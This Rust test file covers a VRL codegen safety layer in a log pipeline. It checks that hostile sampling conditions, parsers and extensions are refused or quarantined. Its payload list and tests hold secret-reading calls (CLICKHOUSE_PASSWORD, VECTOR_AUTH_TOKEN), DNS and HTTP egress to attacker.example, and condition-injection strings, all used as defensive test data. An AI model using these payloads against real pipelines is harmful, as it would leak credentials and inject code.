// SPDX-License-Identifier: AGPL-3.0-or-later

//! NAN-5012 / NAN-5033 / NAN-5057: the VRL codegen safety layer.

use super::*;
use crate::parsers::vrl_functions::parser_vrl_functions;

fn parser() -> Parser {
    Parser {
        activation_parked: false,
        id: uuid::Uuid::new_v4(),
        name: "acme".into(),
        description: None,
        source_type: "routed".into(),
        parser_vrl: ".parsed = true".into(),
        output_fields: None,
        feed_id: None,
        dispatch_source_config_id: None,
        dispatch_route_name: None,
        enabled: true,
        validated: true,
        validation_error: None,
        category: None,
        vendor: None,
        product: None,
        kind: "log".into(),
        enrich_kind: None,
        enrich_source: None,
        target_table: None,
        normalize_vrl: None,
        namespace: "default".into(),
        timezone: "UTC".into(),
        match_values: None,
        sampling_ratio: Some(0.1),
        sampling_exclude_condition: None,
        extension_vrl: None,
        extension_enabled: false,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    }
}

/// The exploit payloads from the security review (finding #5) and the
/// obvious variants: collector env secrets, DNS / HTTP egress, service logs.
const HOSTILE_CONDITIONS: &[&str] = &[
    r#"get_env_var!("CLICKHOUSE_PASSWORD") != """#,
    r#"get_env_var("VECTOR_AUTH_TOKEN") ?? "" == "x""#,
    r#"(dns_lookup!("x.attacker.example") ?? {}) != {}"#,
    r#"is_object(http_request("http://attacker.example/") ?? null)"#,
    r#"log(.) == null"#,
    r#"get_hostname!() == "nano""#,
    // closes the parentheses the condition is rendered inside
    r#"true) || get_env_var!("X") == "" || (true"#,
    // writes the event / metadata
    r#".leak = "x"; true"#,
    r#"%leak = "x"; true"#,
    r#"del(.message) != null"#,
    // a trailing comment would swallow the rendered closing parenthesis
    r#"true # )"#,
    // multi-line program
    "x = 1\ntrue",
    // Vector env interpolation / secret backend
    r#".x == "${CLICKHOUSE_PASSWORD}""#,
    r#".x == "SECRET[backend.key]""#,
];

#[test]
fn hostile_conditions_are_refused() {
    for condition in HOSTILE_CONDITIONS {
        let verdict = check_condition("sampling_exclude_condition", condition);
        assert!(verdict.is_err(), "must refuse {condition:?}");
        assert!(
            verdict.unwrap_err().starts_with("sampling_exclude_condition: "),
            "errors name the field"
        );
    }
}

/// Shapes operators actually write (the docs example first) keep working.
#[test]
fn ordinary_conditions_compile() {
    for condition in [
        r#".action != "allow""#,
        r#".severity == "critical""#,
        r#"includes(["critical", "high"], .severity)"#,
        r#"exists(.user) && .user != "system""#,
        r#"contains(to_string(.message) ?? "", "error")"#,
        r#"match(to_string(.message) ?? "", r'fail(ed|ure)')"#,
        r#"ip_cidr_contains("10.0.0.0/8", to_string(.src_ip) ?? "") ?? false"#,
        r#"to_int(.status) ?? 0 >= 500"#,
        // not a boolean: rendered as `(...) == true`, so simply "not excluded"
        ".severity",
        "  .action == \"deny\"  ",
    ] {
        check_condition("sampling_exclude_condition", condition)
            .unwrap_or_else(|e| panic!("{condition:?} must be accepted: {e}"));
    }
}

#[test]
fn rendered_condition_is_a_read_only_boolean_predicate() {
    let rendered = render_condition(".severity");
    let compiled = crate::parsers::vrl_guard::compile_read_only(&rendered, &parser_vrl_functions())
        .unwrap_or_else(|e| panic!("{}", e.render(&rendered)));
    assert!(compiled.program.final_type_info().result.is_boolean());
}

#[test]
fn vrl_string_body_round_trips_every_hostile_value() {
    for value in [
        "plain",
        "quote \" backslash \\ newline \n cr \r tab \t",
        "triple ''' single",
        "template {{ secret }} braces }",
        "control \u{1} \u{7f} del",
        "routed\"\n.x = get_env_var!(\"CLICKHOUSE_PASSWORD\")\n#",
        "unicode é ✓",
    ] {
        let literal = vrl_str(value);
        assert!(!literal.contains("'''"), "{literal}");
        assert!(!literal.contains('\n'), "{literal}");
        let program = format!(".out = {literal}");
        let compiled = crate::parsers::vrl_guard::compile(&program, &parser_vrl_functions())
            .unwrap_or_else(|e| panic!("{value:?}: {}", e.render(&program)));
        let mut event = vrl::value::Value::Object(Default::default());
        let mut target = vrl::compiler::TargetValue {
            value: event.clone(),
            metadata: vrl::value::Value::Object(Default::default()),
            secrets: vrl::value::Secrets::default(),
        };
        let mut state = vrl::compiler::state::RuntimeState::default();
        let tz = vrl::compiler::TimeZone::default();
        let mut ctx = vrl::compiler::Context::new(&mut target, &mut state, &tz);
        compiled.program.resolve(&mut ctx).unwrap();
        event = target.value;
        assert_eq!(
            event.as_object().and_then(|o| o.get("out")).and_then(|v| v.as_str()).map(|s| s.to_string()),
            Some(value.to_string()),
            "the runtime value must equal the input byte for byte"
        );
    }
}

#[test]
fn healthy_source_renders_unchanged() {
    let mut p = parser();
    p.sampling_exclude_condition = Some(r#".action != "allow""#.into());
    p.extension_vrl = Some(".ext.extra = true".into());
    p.extension_enabled = true;
    let (safe, notes) = quarantine(&p);
    assert!(notes.is_empty(), "{notes:?}");
    assert_eq!(safe.parser_vrl, p.parser_vrl);
    assert_eq!(safe.sampling_ratio, p.sampling_ratio);
    assert!(safe.extension_enabled);
}

#[test]
fn hostile_condition_turns_sampling_off_not_data_off() {
    let mut p = parser();
    p.sampling_exclude_condition = Some(r#"get_env_var!("CLICKHOUSE_PASSWORD") != """#.into());
    let (safe, notes) = quarantine(&p);
    assert_eq!(safe.sampling_ratio, None, "no sample transform: every event is kept");
    assert_eq!(safe.parser_vrl, p.parser_vrl, "parsing is untouched");
    assert_eq!(notes.len(), 1);
    assert!(notes[0].starts_with("Sampling paused"), "{}", notes[0]);
    assert!(quarantine_note(&notes).unwrap().starts_with(QUARANTINE_NOTE_PREFIX));
}

#[test]
fn hostile_parser_is_quarantined_to_the_parse_failure_path() {
    let mut p = parser();
    p.parser_vrl = r#".leak = get_env_var!("CLICKHOUSE_PASSWORD")"#.into();
    let (safe, notes) = quarantine(&p);
    assert_eq!(safe.parser_vrl, QUARANTINED_PARSER_VRL);
    assert!(notes.iter().any(|n| n.starts_with("Parser quarantined")), "{notes:?}");
    // the quarantine program itself passes the allowlist
    check_program("parser_vrl", QUARANTINED_PARSER_VRL).unwrap();
}

#[test]
fn hostile_extension_is_skipped() {
    let mut p = parser();
    p.extension_vrl = Some(r#".ext.x = dns_lookup!("a.attacker.example")"#.into());
    p.extension_enabled = true;
    let (safe, notes) = quarantine(&p);
    assert!(!safe.extension_enabled);
    assert_eq!(safe.parser_vrl, p.parser_vrl, "the base parser keeps running");
    assert!(notes.iter().any(|n| n.starts_with("Parser extension disabled")), "{notes:?}");
}

#[test]
fn stub_source_that_loses_its_extension_is_quarantined_whole() {
    let mut p = parser();
    p.parser_vrl = String::new();
    p.extension_vrl = Some(r#".x = get_env_var!("X")"#.into());
    p.extension_enabled = true;
    let (safe, notes) = quarantine(&p);
    assert_eq!(safe.parser_vrl, QUARANTINED_PARSER_VRL);
    assert!(!safe.extension_enabled);
    assert_eq!(notes.len(), 2, "{notes:?}");
}

#[test]
fn disabled_and_enrichment_sources_are_left_alone() {
    let mut p = parser();
    p.parser_vrl = r#".x = get_env_var!("X")"#.into();
    p.enabled = false;
    assert!(quarantine(&p).1.is_empty());
    p.enabled = true;
    p.kind = "enrichment".into();
    assert!(quarantine(&p).1.is_empty());
}

#[test]
fn check_program_uses_the_parser_allowlist() {
    assert!(check_program("parser_vrl", r#".x = get_env_var!("X")"#).is_err());
    assert!(check_program("parser_vrl", r#"log(.message)"#).is_err());
    assert!(check_program("parser_vrl", r#".x = "SECRET[a.b]""#).is_err());
    check_program("parser_vrl", ".x = upcase(string!(.message))").unwrap();
}
